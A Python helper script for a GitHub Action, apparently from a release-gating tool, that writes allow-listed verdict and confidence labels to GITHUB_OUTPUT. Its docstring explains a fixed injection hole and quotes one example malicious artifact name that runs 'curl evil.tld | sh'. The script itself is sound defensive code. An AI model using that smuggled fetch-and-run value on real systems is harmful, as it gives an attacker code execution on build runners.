#!/usr/bin/env python3
"""TSK_157 — write ``verdict`` and ``confidence`` outputs to ``$GITHUB_OUTPUT``.

Previously the action did this inline as ``python -c '...'`` with the
artifact path interpolated via ``${{ inputs.artifact-name }}``. That was
the second-class RES_154 P0 #3 injection seam: a malicious
``artifact-name`` like ``foo"; __import__("os").system("curl evil.tld | sh"); "``
could close the Python string literal and execute arbitrary code under
the runner.

This script replaces that with a checked-in helper. Inputs flow in only
through environment variables that the action sets at the step level;
nothing is composed from action expressions. Failures are *silent in
exit code* (so the action can continue and surface the gate's own exit)
but explicit in the workflow output line — the helper always writes
``verdict=UNKNOWN`` / ``confidence=UNKNOWN`` rather than aborting.

Env contract (set by the action step):

* ``AGENTSCORE_ARTIFACT_PATH``  — absolute or runner-relative path
* ``GITHUB_OUTPUT``             — path provided by the runner

We deliberately do NOT read ``AGENTSCORE_TOKEN`` here. The helper has no
network access, no secret use, no JSON-payload echo of anything we
didn't author ourselves.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from typing import Any

VALID_VERDICTS: frozenset[str] = frozenset(
    {"BLOCKED", "NEEDS_FIXES", "REVIEW_REQUIRED", "RELEASE_CANDIDATE"}
)
VALID_CONFIDENCE: frozenset[str] = frozenset({"LOW", "MEDIUM", "HIGH"})


def _coerce_label(raw: Any, allowed: frozenset[str]) -> str:
    """Return ``raw`` upper-cased iff it lands in ``allowed``, else 'UNKNOWN'.

    Even on a valid artifact, a downstream consumer could read garbage
    out of ``release_decision.verdict`` (e.g. injected via a
    pre-TSK_155 contaminated suite). Re-anchor on a closed allow-list
    so the workflow output is always one of the agreed labels.
    """

    if not isinstance(raw, str):
        return "UNKNOWN"
    normalised = raw.strip().upper()
    return normalised if normalised in allowed else "UNKNOWN"


def _load_release_decision(artifact_path: str) -> dict[str, Any]:
    """Load and return the ``release_decision`` object from the artifact.

    Returns an empty dict on any failure (missing file, invalid JSON,
    non-dict root, missing ``release_decision`` key). Never raises.
    """

    try:
        with open(artifact_path, encoding="utf-8") as fh:
            data = json.load(fh)
    except (FileNotFoundError, IsADirectoryError, PermissionError, OSError):
        return {}
    except json.JSONDecodeError:
        return {}

    if not isinstance(data, dict):
        return {}
    rd = data.get("release_decision")
    return rd if isinstance(rd, dict) else {}


def write_outputs(artifact_path: str, github_output_path: str) -> None:
    """Append ``verdict=...`` / ``confidence=...`` to GITHUB_OUTPUT.

    Idempotent on the success path: we always append exactly two lines.
    The helper never opens GITHUB_OUTPUT for *read*; appending is
    GitHub's documented contract for multi-key step outputs.
    """

    rd = _load_release_decision(artifact_path)
    verdict = _coerce_label(rd.get("verdict"), VALID_VERDICTS)
    confidence = _coerce_label(rd.get("confidence"), VALID_CONFIDENCE)

    # Write to a temp buffer first so a write error doesn't leave a half-
    # written line that the runner would mis-parse. Two ASCII lines, no
    # interpolation.
    payload = f"verdict={verdict}\nconfidence={confidence}\n"
    with open(github_output_path, "a", encoding="utf-8") as fh:
        fh.write(payload)


def main() -> int:
    artifact_path = os.environ.get("AGENTSCORE_ARTIFACT_PATH", "").strip()
    github_output = os.environ.get("GITHUB_OUTPUT", "").strip()
    if not github_output:
        # No runner context — nothing to do, but don't fail the step.
        print(
            "::warning::GITHUB_OUTPUT not set; skipping verdict/confidence "
            "extraction.",
            file=sys.stderr,
        )
        return 0
    if not artifact_path:
        # Nothing to read — write UNKNOWN so downstream steps that gate
        # on outputs.verdict have a stable shape.
        with open(github_output, "a", encoding="utf-8") as fh:
            fh.write("verdict=UNKNOWN\nconfidence=UNKNOWN\n")
        return 0
    if not Path(artifact_path).is_file():
        with open(github_output, "a", encoding="utf-8") as fh:
            fh.write("verdict=UNKNOWN\nconfidence=UNKNOWN\n")
        return 0

    write_outputs(artifact_path, github_output)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
